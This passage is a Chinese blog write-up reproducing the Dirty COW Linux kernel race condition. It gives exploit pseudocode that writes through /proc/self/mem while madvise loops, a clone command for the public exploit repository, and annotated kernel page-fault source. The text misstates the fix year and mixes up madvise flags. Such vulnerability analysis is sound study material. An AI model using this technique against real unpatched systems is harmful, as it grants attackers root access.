  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/" class="post-title-link" itemprop="url">Kernel 现实漏洞复现：Dirty Cow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-22 19:05:20" itemprop="dateCreated datePublished" datetime="2022-11-22T19:05:20+08:00">2022-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-02-26 01:45:16" itemprop="dateModified" datetime="2024-02-26T01:45:16+08:00">2024-02-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Cow 漏洞成因</strong></p>
<p>Dirty COW 漏洞是一种发生在写时复制 Copy-On-Write 的条件竞争漏洞</p>
<ul>
<li>自2007年9月 <code>linux kernel-2.6.22</code> 被引入，直到2018年 <code>linux kernel 4.8.3, 4.7.9, 4.4.26</code> 之后才被彻底修复</li>
</ul>
<p>写时复制：</p>
<ul>
<li>使用 <code>fork</code> 系统调用创建子进程，那么这个子进程通过使页表条目指向相同的物理内存来共享父进程内存</li>
<li>当任何进程试图写入内存时，会引发异常，OS 将为子进程分配新的物理内存，从父进程复制内容，更改每个进程的页表使它指向自己的私有内存副本</li>
<li>其基本原理为：修改父页面为不可写（不管之前是什么权限），当程序尝试往该页中写入数据时，程序就会触发页中断，然后根据标志位来判断页中断原因为 COW，之后就调用对应的函数来分配 COW 页，并建立 COW 页表项</li>
</ul>
<p>条件竞争：</p>
<ul>
<li>一个系统或者进程的输出，依赖于不受控制的事件出现顺序，或者出现时机</li>
<li>在多个进程（线程）同时访问和操作相同的数据时，访问的顺序可能与预期有差别，这将造成较为严重的安全问题</li>
</ul>
<p>COW 执行过程执行三个重要步骤：</p>
<ul>
<li>制作映射内存的副本</li>
<li>更新页表，使虚拟内存指向新创建的物理地址</li>
<li>写入内存</li>
</ul>
<p>由于三个步骤不是原子性的，一个线程在执行这三个步骤过程中可能被其他线程中断，从而产生潜在的竞态条件</p>
<p><strong>Dirty Cow 漏洞利用</strong></p>
<p>Dirty Cow 的利用需要两个系统调用：</p>
<ul>
<li><code>mmap</code>：将一个文件或者其它对象映射到进程的地址空间</li>
<li><code>madvise</code>：建议内核如何使用指定段的内存（当参数设置为 <code>MADV_WILLNEED</code> 时，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dirtycow/dirtycow.github.io</span><br></pre></td></tr></table></figure>
<p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">    fd = open(filename, O_RDONLY)</span><br><span class="line">    fstat(fd, &amp;st)</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, st.st_size , PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>) </span><br><span class="line">    start Thread1</span><br><span class="line">    start Thread2</span><br><span class="line">    </span><br><span class="line">Thread1：</span><br><span class="line">    f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        lseek(f, <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(f, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">        </span><br><span class="line">Thread2：</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br></pre></td></tr></table></figure>
<ul>
<li>主线程打开目标文件，并且把该文件映射到内存（非匿名映射）</li>
<li>Thread1 循环向写入 <code>map</code> 中写入数据</li>
<li>Thread2 循环对 <code>map</code> 解除映射</li>
</ul>
<p>接下来就详细分析一下这个过程：（内核版本为：4.1.4）</p>
<p>用户态 <code>mmap</code> 在内核中对应的函数为 <code>sys_mmap</code>，其核心函数为 <code>do_mmap_pgoff</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">do_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> *populate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">vm_flags_t</span> vm_flags;</span><br><span class="line"></span><br><span class="line">	*populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Does the application expect PROT_READ to imply PROT_EXEC?</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (the exception is when the underlying filesystem is noexec</span></span><br><span class="line"><span class="comment">	 *  mounted, in which case we dont add PROT_EXEC.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((prot &amp; PROT_READ) &amp;&amp; (current-&gt;personality &amp; READ_IMPLIES_EXEC))</span><br><span class="line">		<span class="keyword">if</span> (!(file &amp;&amp; (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC)))</span><br><span class="line">			prot |= PROT_EXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; MAP_FIXED))</span><br><span class="line">		addr = round_hint_to_min(addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Careful about overflows.. */</span></span><br><span class="line">	len = PAGE_ALIGN(len);</span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* offset overflow? */</span></span><br><span class="line">	<span class="keyword">if</span> ((pgoff + (len &gt;&gt; PAGE_SHIFT)) &lt; pgoff)</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Too many mappings? */</span></span><br><span class="line">	<span class="keyword">if</span> (mm-&gt;map_count &gt; sysctl_max_map_count)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Obtain the address to map to. we verify (or select) it and ensure</span></span><br><span class="line"><span class="comment">	 * that it represents a valid section of the address space.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	addr = get_unmapped_area(file, addr, len, pgoff, flags); <span class="comment">/* 获取一段当前进程未被使用的虚拟地址空间,并返回其起始地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Do simple checking here so the lower-level routines won&#x27;t have</span></span><br><span class="line"><span class="comment">	 * to. we assume access permissions have been handled by the open</span></span><br><span class="line"><span class="comment">	 * of the memory object, so we don&#x27;t do any here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</span><br><span class="line">			mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_LOCKED)</span><br><span class="line">		<span class="keyword">if</span> (!can_do_mlock())</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mlock_future_check(mm, vm_flags, len))</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED: <span class="comment">/* 共享映射 */</span></span><br><span class="line">			<span class="keyword">if</span> ((prot&amp;PROT_WRITE) &amp;&amp; !(file-&gt;f_mode&amp;FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure we don&#x27;t allow writing to an append-only</span></span><br><span class="line"><span class="comment">			 * file..</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (IS_APPEND(inode) &amp;&amp; (file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure there are no mandatory locks on the file.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (locks_verify_locked(file))</span><br><span class="line">				<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				vm_flags &amp;= ~(VM_MAYWRITE | VM_SHARED);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* fall through */</span></span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE: <span class="comment">/* 私有内存 */</span></span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line">			<span class="keyword">if</span> (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC) &#123;</span><br><span class="line">				<span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line">					<span class="keyword">return</span> -EPERM;</span><br><span class="line">				vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line">				<span class="keyword">return</span> -ENODEV;</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED:</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Ignore pgoff.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = <span class="number">0</span>;</span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Set pgoff according to addr for anon_vma.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Set &#x27;VM_NORESERVE&#x27; if we should not account for the</span></span><br><span class="line"><span class="comment">	 * memory use of this mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_NORESERVE) &#123;</span><br><span class="line">		<span class="comment">/* We honor MAP_NORESERVE if allowed to overcommit */</span></span><br><span class="line">		<span class="keyword">if</span> (sysctl_overcommit_memory != OVERCOMMIT_NEVER)</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* hugetlb applies strict overcommit unless MAP_NORESERVE */</span></span><br><span class="line">		<span class="keyword">if</span> (file &amp;&amp; is_file_hugepages(file))</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr = mmap_region(file, addr, len, vm_flags, pgoff); <span class="comment">/* 完成映射过程 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR_VALUE(addr) &amp;&amp;</span><br><span class="line">	    ((vm_flags &amp; VM_LOCKED) ||</span><br><span class="line">	     (flags &amp; (MAP_POPULATE | MAP_NONBLOCK)) == MAP_POPULATE))</span><br><span class="line">		*populate = len;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面就是根据 <code>flags</code> 中的标志位进行一些设置</li>
<li>后面进入 <code>mmap_region</code> 函数完成映射</li>
<li>值得注意的一点是：如果没有设置 <code>flag=MAP_POPULATE</code>（提前建立页表的标志位），是不会建立页表项的</li>
<li>也就是说，当后续的 <code>write</code> 读取该 VMA 对应的地址空间时，会触发缺页异常 <code>page_fault</code></li>
</ul>
<p><code>page_fault</code> 可能有多种原因：</p>
<ul>
<li>访问地址不在虚拟地址空间</li>
<li>访问地址在虚拟地址空间中，但没有访问权限</li>
<li>访问地址在虚拟地址空间中，但没有与物理地址间建立映射关系</li>
</ul>
<p>Linux 内核关于 <code>page_fault</code> 的处理是通过一系列系统调用函数实现的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_page_fault() -&gt; handle_mm_fault() -&gt; handle_pte_fault() -&gt; do_fault()</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_page_fault</code>：会检查多种异常原因，比如缺页异常的地址在内核空间还是用户空间，是内核态还是用户态触发的异常等等情况</li>
<li><code>handle_mm_fault</code>：为发生 <code>page_fault</code> 的地址分配各级页表目录</li>
<li><code>handle_pte_fault</code>：从上层函数得到了缺页异常的 <code>pte</code>（页表项），然后做多层检查</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	entry = *pte;</span><br><span class="line">	barrier();</span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123; <span class="comment">/* pte所指向的物理地址不存在 */</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123; <span class="comment">/* pte中内容为空,表示进程第一次访问该页 */</span></span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops)</span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry); <span class="comment">/* 非匿名区域,分配物理页框 */</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> do_anonymous_page(mm, vma, address, pte, pmd,</span><br><span class="line">					flags); <span class="comment">/* vma为匿名区域,分配物理页框,初始化为全&#x27;0&#x27; */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry); <span class="comment">/* 说明该页之前存在于主存中,但是被Swap机制换出了,于是再次换回即可 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">/* pte所指向的物理地址存在,即该页在物理内存中 */</span></span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry)) <span class="comment">/* 对应的页不可写 */</span></span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry); <span class="comment">/* 进行写时复制,将内容写到副本页面上 */</span></span><br><span class="line">		entry = pte_mkdirty(entry); <span class="comment">/* 对应的页可写,将该页&quot;标脏&quot; */</span></span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) <span class="comment">/* 如果存在FAULT_FLAG_WRITE标志位,表示缺页异常由写操作引起 */</span></span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果该 <code>pte</code> 不在物理内存中<ul>
<li>如果 <code>pte</code> 为空，说明进程第一次访问该页面<ul>
<li>如果 <code>vma</code> 属性是匿名映射（没有真实的磁盘文件与该地址对应）</li>
<li>如果 <code>vma</code> 不是匿名，说明是文件映射，进入 <code>do_fault</code> 函数</li>
</ul>
</li>
<li>如果 <code>pte</code> 不为空，说明该页此前访问过，但是被换出了，只需要再换入即可</li>
<li>PS：<code>pte</code> 既可以索引到内存中的物理页，也可以索引交换区描述符 <code>swap_info_struct</code> 在 <code>swap_info</code> 数组的下标，以及在 <code>swap_map</code> 中的偏移量</li>
</ul>
</li>
<li>如果该 <code>pte</code> 在物理内存中，说明此次 <code>page_fault</code> 不是页面缺失引起，检查是否由写操作引起<ul>
<li>页面不可写，进入 <code>do_wp_page</code> 进行 COW 操作</li>
<li>页面可写，标记 <code>dirty</code> 位</li>
</ul>
</li>
<li><code>do_fault</code>：检查各种标志位，根据不同的情况调用不同的函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE)) <span class="comment">/* 非写操作引起的缺页异常(读操作) */</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) <span class="comment">/* 非访问共享内存(私有文件映射)引起的缺页异常(写操作) */</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte); <span class="comment">/* 进行写时复制,缺页的COW处理函数 */</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte); <span class="comment">/* 访问共享内存引起的缺页异常 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dirty Cow 漏洞就源自于内核对 Cow 的处理不当，这里我们重点关注以下函数：</p>
<ul>
<li><code>do_wp_page</code>：不缺页的 COW 处理函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 